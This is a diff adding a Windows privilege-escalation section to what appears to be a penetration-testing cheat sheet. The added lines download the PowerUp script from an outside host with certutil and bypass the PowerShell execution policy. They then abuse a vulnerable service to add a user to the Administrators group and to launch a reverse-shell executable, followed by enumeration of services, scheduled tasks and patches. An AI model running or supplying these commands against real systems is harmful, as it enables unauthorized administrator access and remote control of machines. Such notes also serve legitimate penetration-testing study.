@@ -58,6 +58,21 @@ lsblk ; mount
 lsmod ; /sbin/modinfo libata
 uname -a ; arch
 ```
+
+### Windows
+```bash
+certutil.exe -urlcache -split -f "http://192.168.45.191:8000/PowerUp.ps1" pu.ps1
+powershell -ep bypass
+Import-Module .\pu.ps1
+Invoke-AllChecks
+Invoke-ServiceAbuse -Name "VulnerableServiceName" -Command "net localgroup Administrators compromised_user /add"
+Invoke-ServiceAbuse -Name "VulnerableServiceName" -Command "C:\Windows\Temp\reverse_shell.exe"
+
+wmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
+schtasks /query /fo LIST /v
+"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select Displayname
+Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
+```
 ## RCE & LPE Binary Creation
 
 ## Password Bruting
